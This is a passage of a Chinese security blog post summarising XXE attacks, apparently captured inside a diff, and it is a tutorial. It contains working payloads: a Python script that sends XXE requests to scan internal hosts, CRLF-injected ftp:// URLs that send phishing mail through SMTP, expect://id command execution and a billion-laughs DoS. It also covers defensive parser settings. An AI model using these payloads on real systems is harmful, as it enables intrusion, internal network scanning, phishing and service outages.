class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">v1rus</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">v1rus</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>evil.dtd</strong></p>
+<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">all</span> <span class="meta-string">"%start;%goodies;%end;"</span>&gt;</span> <span class="comment">&lt;!-- 实体引用三个参数实体拼接字符串--&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p><a href="./XXE总结_XXE总结 _ v1rus blog_files/image-20201119120734859.png" class="fancybox fancybox.image" rel="group"><img src="./XXE总结_XXE总结 _ v1rus blog_files/image-20201119120734859.png" alt="image-20201119120734859"></a></p>
+<p>​    </p>
+<h2 id="新的利用"><a href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#%E6%96%B0%E7%9A%84%E5%88%A9%E7%94%A8" class="headerlink" title="新的利用"></a>新的利用</h2><p>​    我们不能将眼光局限于 file 协议：所以必须清楚地知道在何种平台，才能知道在什么环境下，能用何种协议。</p>
+<p><a href="./XXE总结_XXE总结 _ v1rus blog_files/20181120002647-e93bbf00-ec17-1.png" class="fancybox fancybox.image" rel="group"><img src="./XXE总结_XXE总结 _ v1rus blog_files/20181120002647-e93bbf00-ec17-1.png" alt="20181120002647-e93bbf00-ec17-1"></a></p>
+<p><a href="./XXE总结_XXE总结 _ v1rus blog_files/20181120002647-e965b74c-ec17-1.png" class="fancybox fancybox.image" rel="group"><img src="./XXE总结_XXE总结 _ v1rus blog_files/20181120002647-e965b74c-ec17-1.png" alt="20181120002647-e965b74c-ec17-1"></a></p>
+<blockquote>
+<p><strong>注意：</strong></p>
+<p>1.其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7<br>update 7 和 Oracle JDK 1.6 update 35<br>2.libxml 是 PHP 的 xml 支持</p>
+</blockquote>
+<h3 id="SSRF"><a href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>​    之所以我称它为ssrf就是因为利用xxe漏洞使服务器去请求数据，包括内网。那么就可以使用dict（dict://127.0.0.1:22/info查看bannner信息）、gopher协议（支持GET&amp;POST请求，或者redis用户名密码爆破，写反弹shell再想办法提权（之前做到过openbasedir()函数绕过））进行内网主机端口指纹扫描或者简单探测内网。</p>
+<h4 id="内网主机探测"><a href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B" class="headerlink" title="内网主机探测"></a>内网主机探测</h4><p>​    先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces（网卡开启情况） 或者 /proc/net/arp（保留的arp信息） 或者 /etc/host（域名解析情况） 文件以后我们就有了大致的探测方向了。</p>
+<p><strong>下面是一个探测脚本的实例：</strong></p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment">#Origtional XML that the server accepts</span></span><br><span class="line"><span class="comment">#&lt;xml&gt;</span></span><br><span class="line"><span class="comment">#    &lt;stuff&gt;user&lt;/stuff&gt;</span></span><br><span class="line"><span class="comment">#&lt;/xml&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_xml</span><span class="params">(string)</span>:</span></span><br><span class="line">    xml = <span class="string">"""&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;"""</span></span><br><span class="line">    xml = xml + <span class="string">"\r\n"</span> + <span class="string">"""&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;"""</span></span><br><span class="line">    xml = xml + <span class="string">"\r\n"</span> + <span class="string">"""&lt;!ENTITY xxe SYSTEM """</span> + <span class="string">'"'</span> + string + <span class="string">'"'</span> + <span class="string">"""&gt;]&gt;"""</span></span><br><span class="line">    xml = xml + <span class="string">"\r\n"</span> + <span class="string">"""&lt;xml&gt;"""</span></span><br><span class="line">    xml = xml + <span class="string">"\r\n"</span> + <span class="string">"""    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;"""</span></span><br><span class="line">    xml = xml + <span class="string">"\r\n"</span> + <span class="string">"""&lt;/xml&gt;"""</span></span><br><span class="line">    send_xml(xml)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_xml</span><span class="params">(xml)</span>:</span></span><br><span class="line">    headers = {<span class="string">'Content-Type'</span>: <span class="string">'application/xml'</span>}</span><br><span class="line">    x = requests.post(<span class="string">'http://fooweb.com/CUSTOM/NEW_XEE.php'</span>, data=xml, headers=headers, timeout=<span class="number">5</span>).text</span><br><span class="line">    coded_string = x.split(<span class="string">' '</span>)[<span class="number">-2</span>] <span class="comment"># a little split to get only the base64 encoded value</span></span><br><span class="line">    <span class="keyword">print</span> coded_string</span><br><span class="line"><span class="comment">#   print base64.b64decode(coded_string)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = str(i)</span><br><span class="line">        ip = <span class="string">'10.0.0.'</span> + i  <span class="comment">#根据探测情况改c端ip地址</span></span><br><span class="line">        string = <span class="string">'php://filter/convert.base64-encode/resource=http://'</span> + ip + <span class="string">'/'</span></span><br><span class="line">        <span class="keyword">print</span> string</span><br><span class="line">        build_xml(string)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="端口扫描"><a href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>​    只要把ip 地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的</p>
+<p>可以使用bp的intruder模块扫描端口</p>
+<p><a href="./XXE总结_XXE总结 _ v1rus blog_files/image-20201120002657149.png" class="fancybox fancybox.image" rel="group"><img src="./XXE总结_XXE总结 _ v1rus blog_files/image-20201120002657149.png" alt="image-20201120002657149"></a></p>
+<p>左侧135端口开放，右侧关闭（乱码）。</p>
+<p><a href="./XXE总结_XXE总结 _ v1rus blog_files/image-20201120002808201.png" class="fancybox fancybox.image" rel="group"><img src="./XXE总结_XXE总结 _ v1rus blog_files/image-20201120002808201.png" alt="image-20201120002808201"></a></p>
+<p>445端口也是开放的</p>
+<h4 id="内网盲注（强网杯）"><a href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#%E5%86%85%E7%BD%91%E7%9B%B2%E6%B3%A8%EF%BC%88%E5%BC%BA%E7%BD%91%E6%9D%AF%EF%BC%89" class="headerlink" title="内网盲注（强网杯）"></a>内网盲注（强网杯）</h4><p>这里简单介绍这题两个知识点，具体操作网上有</p>
+<p>1、当我们使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错，于是我们就需要使用 php过滤器的一个压缩的方法</p>
+<p>压缩：echo file_get_contents(“php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd”);<br>解压：echo file_get_contents(“php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1”);</p>
+<p>2、防扫描</p>
+<p>当然对一般的目录扫描效果不大，一般都是 HEAD 请求，请求资源头部信息。</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$agent = strtolower($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line"><span class="comment">//check for nikto, sql map or "bad" subfolders which only exist on wordpress</span></span><br><span class="line"><span class="keyword">if</span> (strpos($agent, <span class="string">'nikto'</span>) !== <span class="keyword">false</span> || strpos($agent, <span class="string">'sqlmap'</span>) !== <span class="keyword">false</span> || startswith($url,<span class="string">'wp-'</span>) || startswith($url,<span class="string">'wordpress'</span>) || startswith($url,<span class="string">'wp/'</span>))</span><br><span class="line">{</span><br><span class="line">    sendBomb();</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendBomb</span><span class="params">()</span></span>{</span><br><span class="line">    <span class="comment">//prepare the client to recieve GZIP data. This will not be suspicious</span></span><br><span class="line">    <span class="comment">//since most web servers use GZIP by default</span></span><br><span class="line">    header(<span class="string">"Content-Encoding: gzip"</span>);</span><br><span class="line">    header(<span class="string">"Content-Length: "</span>.filesize(<span class="string">'www.gzip'</span>));</span><br><span class="line">    <span class="comment">//Turn off output buffering</span></span><br><span class="line">    <span class="keyword">if</span> (ob_get_level()) ob_end_clean();</span><br><span class="line">    <span class="comment">//send the gzipped file to the client</span></span><br><span class="line">    readfile(<span class="string">'10G.gzip'</span>);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">startsWith</span><span class="params">($haystack,$needle)</span></span>{</span><br><span class="line">    <span class="keyword">return</span> (substr($haystack,<span class="number">0</span>,strlen($needle)) === $needle);</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h4 id="文件上传"><a href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0" class="headerlink" title="文件上传"></a>文件上传</h4><p> Java 中有一个比较神奇的协议 jar:// ， php 中的 phar:// 似乎就是为了实现 jar:// 的类似的功能设计出来的。</p>
+<p><strong>jar:// 协议的格式：</strong></p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:{url}!{path}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jar:http://host/application.jar!/file/within/the/zip</span><br><span class="line"></span><br><span class="line">这个 ! 后面就是其需要从中解压出的文件</span><br></pre></td></tr></tbody></table></figure>
+
+<p>jar 能从远程获取 jar 文件，然后将其中的内容进行解压，等等，这个功能似乎比 phar 强大啊，phar:// 是没法远程加载文件的（因此 phar:// 一般用于绕过文件上传，在一些2016年的HCTF中考察过这个知识点，我也曾在校赛中出过类似的题目，奥，2018年的 blackhat 讲述的 phar:// 的反序列化很有趣，Orange 曾在2017年的 hitcon 中出过这道题）</p>
+<p><strong>jar 协议处理文件的过程：</strong></p>
+<p>(1) 下载 jar/zip 文件到临时文件中<br>(2) 提取出我们指定的文件<br>(3) 删除临时文件</p>
+<blockquote>
+<p><strong>那么我们怎么找到我们下载的临时文件呢？</strong></p>
+<p>因为在 java 中 file:/// 协议可以起到列目录的作用，所以我们能用 file:/// 协议配合 jar:// 协议使用</p>
+</blockquote>
+<p>下面是我的一些测试过程：</p>
+<p>我首先在本地模拟一个存在 XXE 的程序，网上找的能直接解析 XML 文件的 java 源码</p>
+<p>简单的说就是用jar协议在解包的时候远程文件因为没有我们指定的文件导致java 解析器报错，会在临时文件中生成。剩下的就是让临时文件驻留的时间更长一点的操作了。</p>
+<p>1、用sleep函数</p>
+<p>2、在文件末尾添加垃圾字符，然后在传到最后一秒的时候，停住不动，这样实际上已经传完了，但是服务器以为没传完而已</p>
+<p>剩下的进行文件替换就行</p>
+<p><a href="./XXE总结_XXE总结 _ v1rus blog_files/image-20201120113355504.png" class="fancybox fancybox.image" rel="group"><img src="./XXE总结_XXE总结 _ v1rus blog_files/image-20201120113355504.png" alt="image-20201120113355504"></a></p>
+<h4 id="钓鱼"><a href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#%E9%92%93%E9%B1%BC" class="headerlink" title="钓鱼"></a>钓鱼</h4><p>如果内网有一台易受攻击的 SMTP 服务器，我们就能利用 ftp:// 协议结合 CRLF 注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼（一下实例来自fb 的一篇文章 ）</p>
+<p>Java支持在sun.net.ftp.impl.FtpClient中的ftp URI。因此，我们可以指定用户名和密码，例如<a href="ftp://user:password@host:port/test.txt%EF%BC%8CFTP%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%B0%86%E5%9C%A8%E8%BF%9E%E6%8E%A5%E4%B8%AD%E5%8F%91%E9%80%81%E7%9B%B8%E5%BA%94%E7%9A%84USER%E5%91%BD%E4%BB%A4%E3%80%82">ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。</a></p>
+<p>但是如果我们将%0D%0A (CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：</p>
+<p><strong>示例代码：</strong></p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ftp://a%0D%0A</span><br><span class="line">EHLO%20a%0D%0A</span><br><span class="line">MAIL%20FROM%3A%3Csupport%40VULNERABLESYSTEM.com%3E%0D%0A</span><br><span class="line">RCPT%20TO%3A%3Cvictim%40gmail.com%3E%0D%0A</span><br><span class="line">DATA%0D%0A</span><br><span class="line">From%3A%20support%40VULNERABLESYSTEM.com%0A</span><br><span class="line">To%3A%20victim%40gmail.com%0A</span><br><span class="line">Subject%3A%20test%0A</span><br><span class="line">%0A</span><br><span class="line">test!%0A</span><br><span class="line">%0D%0A</span><br><span class="line">.%0D%0A</span><br><span class="line">QUIT%0D%0A</span><br><span class="line">:a@VULNERABLESYSTEM.com:25</span><br></pre></td></tr></tbody></table></figure>
+
+<p>当FTP客户端使用此URL连接时，以下命令将会被发送给VULNERABLESYSTEM.com上的邮件服务器：</p>
+<p><strong>示例代码：</strong></p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ftp://a</span><br><span class="line">EHLO a</span><br><span class="line">MAIL FROM: &lt;support@VULNERABLESYSTEM.com&gt;</span><br><span class="line">RCPT TO: &lt;victim@gmail.com&gt;</span><br><span class="line">DATA</span><br><span class="line">From: support@VULNERABLESYSTEM.com</span><br><span class="line">To: victim@gmail.com</span><br><span class="line">Subject: Reset your password</span><br><span class="line">We need to confirm your identity. Confirm your password here: http://PHISHING_URL.com</span><br><span class="line">.</span><br><span class="line">QUIT</span><br><span class="line">:support@VULNERABLESYSTEM.com:25</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这意味着攻击者可以从从受信任的来源发送钓鱼邮件（例如：帐户重置链接）并绕过垃圾邮件过滤器的检测。除了链接之外，甚至我们也可以发送附件。</p>
+<h4 id="其他："><a href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#%E5%85%B6%E4%BB%96%EF%BC%9A" class="headerlink" title="其他："></a>其他：</h4><h4 id="1-PHP-expect-RCE"><a href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#1-PHP-expect-RCE" class="headerlink" title="1.PHP expect RCE"></a><strong>1.PHP expect RCE</strong></h4><p>由于 PHP 的 expect 并不是默认安装扩展，如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE</p>
+<p><strong>示例代码：</strong></p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM "expect://id"&gt;]&gt;</span><br><span class="line">&lt;dir&gt;</span><br><span class="line">&lt;file&gt;&amp;cmd;&lt;/file&gt;</span><br><span class="line">&lt;/dir&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="2-利用-XXE-进行-DOS-攻击"><a href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#2-%E5%88%A9%E7%94%A8-XXE-%E8%BF%9B%E8%A1%8C-DOS-%E6%94%BB%E5%87%BB" class="headerlink" title="2. 利用 XXE 进行 DOS 攻击"></a><strong>2. 利用 XXE 进行 DOS 攻击</strong></h4><p><strong>示例代码：</strong></p>
+<p>疯狂解析</p>
+<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line">     <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">lolz</span> [</span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol</span> <span class="meta-string">"lol"</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol2</span> <span class="meta-string">"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol3</span> <span class="meta-string">"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol4</span> <span class="meta-string">"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol5</span> <span class="meta-string">"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol6</span> <span class="meta-string">"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol7</span> <span class="meta-string">"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol8</span> <span class="meta-string">"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol9</span> <span class="meta-string">"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">     ]&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="XXE如何防御"><a href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#XXE%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1" class="headerlink" title="XXE如何防御"></a>XXE如何防御</h2><p>1、手动黑白名单过滤（这是一种不推荐的方法，毕竟存在很多种绕过）</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE、&lt;!ENTITY SYSTEM、PUBLIC</span><br></pre></td></tr></tbody></table></figure>
+
+<p>2、禁用外部实体（基本现在默认都关闭 很少有可利用的地方）</p>
+<p><strong>PHP：</strong></p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>JAVA:</strong></p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">.setFeature("http://apache.org/xml/features/disallow-doctype-decl",true);</span><br><span class="line"></span><br><span class="line">.setFeature("http://xml.org/sax/features/external-general-entities",false)</span><br><span class="line"></span><br><span class="line">.setFeature("http://xml.org/sax/features/external-parameter-entities",false);</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>Python：</strong></p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="后话（如何去搜寻xxe漏洞）"><a href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#%E5%90%8E%E8%AF%9D%EF%BC%88%E5%A6%82%E4%BD%95%E5%8E%BB%E6%90%9C%E5%AF%BBxxe%E6%BC%8F%E6%B4%9E%EF%BC%89" class="headerlink" title="后话（如何去搜寻xxe漏洞）"></a>后话（如何去搜寻xxe漏洞）</h2><p>针对服务器：</p>
+<p>1、查看服务器的回显格式application/xml,appplication/dtd-xml,text/xml</p>
+<p>2、改变请求的方法为<code>POST</code>时，在<code>header</code>头部添加 <code>Content-Type: application/xml</code>并在<code>POST</code>数据中添加了一个不合法的<code>XML</code>数据，==响应==更加说明这里有<code>XXE</code>漏洞了。</p>
+<p>具体：</p>
+<p>Burp 使用Burp Collaborator Client提供一个url，在xxe 的payload中添加。如果目标请求了burp的这个url，即存在xxe。</p>
+<p><a href="./XXE总结_XXE总结 _ v1rus blog_files/image-20201120010610850.png" class="fancybox fancybox.image" rel="group"><img src="./XXE总结_XXE总结 _ v1rus blog_files/image-20201120010610850.png" alt="image-20201120010610850"></a></p>
+<p><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="https://virusday.github.io/2020/11/16/venom%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/venom%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/" rel="next" title="venom安装使用/venom安装使用">
+                <i class="fa fa-chevron-left"></i> venom安装使用/venom安装使用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="https://virusday.github.io/2020/11/20/CRLF%E6%B3%A8%E5%85%A5/CRLF%E6%B3%A8%E5%85%A5/" rel="prev" title="CRLF注入/CRLF注入">
+                CRLF注入/CRLF注入 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first" style="top: 5px; transform: rotateZ(-45deg); width: 100%;"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle" style="opacity: 0;"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last" style="top: -5px; transform: rotateZ(45deg); width: 100%;"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar sidebar-active" style="display: block; width: 320px;">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element" style="opacity: 1; display: block; transform: translateX(0px);">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel" style="">
+        <div class="site-overview" style="max-height: 453px;">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="opacity: 1; display: block; transform: translateX(0px);">
+            
+              <img class="site-author-image" itemprop="image" src="./XXE总结_XXE总结 _ v1rus blog_files/user.jpg" alt="Virusday">
+            
+              <p class="site-author-name" itemprop="name">Virusday</p>
+              <p class="site-description motion-element" itemprop="description" style="opacity: 1; display: block; transform: translateX(0px);">学习的日常</p>
+          </div>
+
+          <nav class="site-state motion-element" style="opacity: 1; display: block; transform: translateX(0px);">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="https://virusday.github.io/archives/">
+              
+                  <span class="site-state-item-count">79</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element" style="opacity: 1; display: block; transform: translateX(0px);">
+              <a href="https://virusday.github.io/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block" style="opacity: 1; display: block; transform: translateX(0px);">
+              <div class="links-of-blogroll-title">
+                <!-- modify icon to fire by szw -->
+                <i class="fa fa-history fa-" aria-hidden="true"></i>
+                近期文章
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                
+                  <li class="recent_posts_li">
